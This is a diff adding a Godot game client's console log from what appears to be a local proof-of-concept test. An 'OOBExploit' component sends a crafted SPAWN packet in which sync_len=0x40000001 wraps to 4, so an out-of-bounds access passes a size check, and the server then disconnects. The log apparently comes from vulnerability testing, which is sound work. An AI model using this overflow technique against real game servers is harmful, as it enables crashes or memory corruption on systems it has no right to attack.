@@ -1,0 +1,49 @@
+Godot Engine v4.4.1.stable.custom_build.49a5bc7b6 (2025-03-25 23:11:16 UTC) - https://godotengine.org
+
+[DBG][@0][#1][netfox::NetworkPerformance] Network performance enabled, registering performance monitors
+Auto-connect: Connecting to server as client...
+Join game, host_ip: 127.0.0.1:8080, game_id: 
+Show loading
+NetworkManager: Loading game scene...
+Main menu ready...
+MultiplayerManager ready!
+Client connected to server/host, on peer 501113970 with auth: 1
+OOBExploit: Connected to server, starting exploit sequence...
+OOBExploit: Sending SIMPLIFY_PATH...
+OOBExploit: SIMPLIFY_PATH packet size: 58
+OOBExploit: SIMPLIFY_PATH sent successfully
+Hide loading
+[DBG][@0][#501113970][netfox::NetworkTimeSynchronizer] Received initial timestamp @ 1784710947.0210s raw time
+[INF][@0][#501113970][netfox::NetworkTimeSynchronizer] Time sync loop started! Initial timestamp: 16.3810000419617s
+[DBG][@491][#501113970][netfox::NetworkTime] Peer #501113970 is now on time!
+OOBExploit: Sending exploit SPAWN packet...
+OOBExploit: SPAWN packet size: 42
+OOBExploit: sync_len=0x40000001 (sync_len*4 wraps to 4)
+OOBExploit: name_len=20, sum=24, remaining=24
+OOBExploit: Check: 24 <= 24 = PASS (will OOB!)
+OOBExploit: Exploit SPAWN sent! Check server ASAN output.
+[WRN][@563][#501113970][netfox::NetworkRollback] Trying to run rollback for ticks 497 to 563, past the history limit of 64
+[WRN][@568][#501113970][netfox::NetworkRollback] Trying to run rollback for ticks 497 to 568, past the history limit of 64
+[WRN][@572][#501113970][netfox::NetworkRollback] Trying to run rollback for ticks 497 to 572, past the history limit of 64
+[WRN][@577][#501113970][netfox::NetworkRollback] Trying to run rollback for ticks 497 to 577, past the history limit of 64
+[WRN][@583][#501113970][netfox::NetworkRollback] Trying to run rollback for ticks 497 to 583, past the history limit of 64
+[WRN][@588][#501113970][netfox::NetworkRollback] Trying to run rollback for ticks 497 to 588, past the history limit of 64
+[WRN][@594][#501113970][netfox::NetworkRollback] Trying to run rollback for ticks 497 to 594, past the history limit of 64
+[WRN][@600][#501113970][netfox::NetworkRollback] Trying to run rollback for ticks 497 to 600, past the history limit of 64
+[WRN][@608][#501113970][netfox::NetworkRollback] Trying to run rollback for ticks 497 to 608, past the history limit of 64
+[WRN][@614][#501113970][netfox::NetworkRollback] Trying to run rollback for ticks 497 to 614, past the history limit of 64
+[WRN][@619][#501113970][netfox::NetworkRollback] Trying to run rollback for ticks 497 to 619, past the history limit of 64
+[WRN][@624][#501113970][netfox::NetworkRollback] Trying to run rollback for ticks 497 to 624, past the history limit of 64
+[WRN][@629][#501113970][netfox::NetworkRollback] Trying to run rollback for ticks 497 to 629, past the history limit of 64
+[WRN][@634][#501113970][netfox::NetworkRollback] Trying to run rollback for ticks 497 to 634, past the history limit of 64
+[WRN][@640][#501113970][netfox::NetworkRollback] Trying to run rollback for ticks 497 to 640, past the history limit of 64
+[WRN][@648][#501113970][netfox::NetworkRollback] Trying to run rollback for ticks 497 to 648, past the history limit of 64
+[WRN][@655][#501113970][netfox::NetworkRollback] Trying to run rollback for ticks 497 to 655, past the history limit of 64
+[WRN][@661][#501113970][netfox::NetworkRollback] Trying to run rollback for ticks 497 to 661, past the history limit of 64
+[WRN][@666][#501113970][netfox::NetworkRollback] Trying to run rollback for ticks 497 to 666, past the history limit of 64
+[WRN][@672][#501113970][netfox::NetworkRollback] Trying to run rollback for ticks 497 to 672, past the history limit of 64
+[WRN][@678][#501113970][netfox::NetworkRollback] Trying to run rollback for ticks 497 to 678, past the history limit of 64
+Server disconnected!
+Removing child network node
+Hide loading
+Main menu ready...
